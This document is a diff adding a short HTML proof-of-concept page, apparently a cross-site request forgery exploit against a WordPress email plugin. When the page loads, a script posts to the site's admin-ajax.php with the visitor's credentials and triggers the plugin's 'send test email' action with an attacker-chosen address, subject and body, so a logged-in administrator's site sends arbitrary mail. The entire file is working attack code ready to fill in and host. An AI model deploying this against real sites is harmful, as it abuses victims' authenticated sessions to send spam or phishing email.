@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body onload=run()>
+<script>
+function run() {
+  var targetUrl = "http://example.com/webpage";
+  var email = "email@example.com";  
+  var subject = "PoC"; 
+  var content = "add content here";  
+
+  var xhttp = new XMLHttpRequest();  
+  var data = "es_test_email=" + email + "&subject=" + subject +"&content=" + content + "&action=es_send_test_email";
+  var url = targetUrl + "/wp-admin/admin-ajax.php?";
+  var method = "POST";
+
+  xhttp.open(method, url);
+  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+  xhttp.withCredentials = true;
+  xhttp.send(data);  }
+</script>
+</body>
+</html>
+
